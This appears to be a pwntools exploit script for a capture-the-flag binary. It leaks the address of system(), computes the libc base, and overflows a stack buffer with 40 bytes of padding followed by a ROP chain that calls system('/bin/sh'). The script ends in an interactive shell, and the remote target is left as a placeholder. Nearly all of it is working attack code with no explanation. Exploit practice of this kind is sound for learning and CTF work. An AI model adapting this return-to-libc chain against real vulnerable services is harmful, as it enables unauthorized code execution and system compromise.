#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = ELF("./libc.so.6")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions

io = start()

io.recvuntil(b"at ")
system = int(io.recvline().strip(),16)
log.info("System: %s" % hex(system))
libc.address = system - 0x50d70
log.info("Libc base: %s" % hex(libc.address))

rop = ROP(libc)

rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(libc.search(b"/bin/sh\x00")))


payload = b"A"*40
payload += rop.chain()
io.sendlineafter(b"else.", payload)

io.interactive()
